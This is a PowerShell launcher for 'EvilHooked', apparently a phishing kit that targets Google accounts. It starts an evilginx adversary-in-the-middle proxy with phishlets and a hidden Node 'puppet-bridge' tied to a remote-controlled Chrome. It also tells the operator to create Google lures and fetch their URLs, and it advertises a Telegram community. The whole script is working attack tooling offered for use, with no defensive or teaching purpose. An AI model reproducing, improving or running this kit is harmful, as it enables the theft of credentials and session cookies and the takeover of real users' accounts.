# Single Evilginx instance for EvilHooked Google kit (ports 53/443/9092).
# Detached Start-Process — survives after this script exits.
$ErrorActionPreference = 'Stop'
$Root = Split-Path $PSScriptRoot -Parent
if (-not (Test-Path (Join-Path $Root 'puppet-bridge'))) {
  $Root = $PSScriptRoot
}
$env:EVILHOOKED_ROOT = $Root
$env:PHISHFORGE_ROOT = $Root  # legacy alias
$env:EVILHOOKED_PUPPET_CONFIG = Join-Path $Root 'evilhooked\puppet-google.json'
$env:PHISHFORGE_PUPPET_CONFIG = $env:EVILHOOKED_PUPPET_CONFIG

# Keep relative paths in puppet-google.json (resolved at runtime from EVILHOOKED_ROOT).
# Strip BOM if present — Node JSON.parse rejects it.
$cfgPath = $env:EVILHOOKED_PUPPET_CONFIG
if (Test-Path $cfgPath) {
  $raw = [System.IO.File]::ReadAllText($cfgPath)
  if ($raw.Length -gt 0 -and [int][char]$raw[0] -eq 0xFEFF) {
    $utf8NoBom = New-Object System.Text.UTF8Encoding $false
    [System.IO.File]::WriteAllText($cfgPath, $raw.Substring(1), $utf8NoBom)
  }
}

Get-Process evilginx -ErrorAction SilentlyContinue | Stop-Process -Force
Get-CimInstance Win32_Process -Filter "Name='node.exe'" -ErrorAction SilentlyContinue | Where-Object {
  $_.CommandLine -match 'puppet-bridge'
} | ForEach-Object { Stop-Process -Id $_.ProcessId -Force -ErrorAction SilentlyContinue }
Start-Sleep -Milliseconds 800

& (Join-Path $Root 'evilhooked\start-puppet-chrome.ps1')
if ($LASTEXITCODE -ne 0) {
  Write-Warning 'CDP Chrome failed — bridge will try to spawn it itself'
}

$evilginxDir = Join-Path $Root 'evilhooked\evilginx'
$exe = Join-Path $evilginxDir 'evilginx.exe'
$phishlets = Join-Path $evilginxDir 'phishlets'
$config = Join-Path $Root 'evilhooked\evilginx-config'

if (-not (Test-Path $exe)) {
  Write-Error "Missing $exe - build evilginx first"
  exit 1
}

$proc = Start-Process -FilePath $exe `
  -WorkingDirectory $evilginxDir `
  -ArgumentList @('-p', $phishlets, '-c', $config, '-developer') `
  -WindowStyle Normal `
  -PassThru

Write-Host "evilginx started pid=$($proc.Id)"
Write-Host "config: $config"
Write-Host "phishlets: $phishlets"
Write-Host "In the evilginx window: lures create google   then   lures get-url N"
Write-Host "community: https://t.me/EvilHooked"

$bridgeDir = Join-Path $Root 'puppet-bridge'
$bridgeEntry = Join-Path $bridgeDir 'src\index.js'
$bridgeCfg = Join-Path $Root 'evilhooked\puppet-google.json'
if (-not (Test-Path (Join-Path $bridgeDir 'node_modules\express'))) {
  Write-Host 'puppet-bridge: installing npm dependencies...'
  Push-Location $bridgeDir
  try { npm install } finally { Pop-Location }
  if (-not (Test-Path (Join-Path $bridgeDir 'node_modules\express'))) {
    Write-Error 'npm install failed — express still missing in puppet-bridge'
    exit 1
  }
}
Start-Process -FilePath 'node' `
  -ArgumentList @($bridgeEntry, $bridgeCfg) `
  -WorkingDirectory $bridgeDir `
  -WindowStyle Hidden | Out-Null

$healthy = $false
for ($i = 0; $i -lt 60; $i++) {
  try {
    $h = Invoke-RestMethod -Uri 'http://127.0.0.1:1000/health' -TimeoutSec 1
    if ($h.ok) {
      Write-Host ("bridge ok mode={0} build={1} transport={2}" -f $h.mode, $h.build, $h.transport)
      $healthy = $true
      break
    }
  } catch { }
  Start-Sleep -Milliseconds 300
}
if (-not $healthy) {
  Write-Host 'bridge not up — check node / puppet-google.json / npm install in puppet-bridge'
}
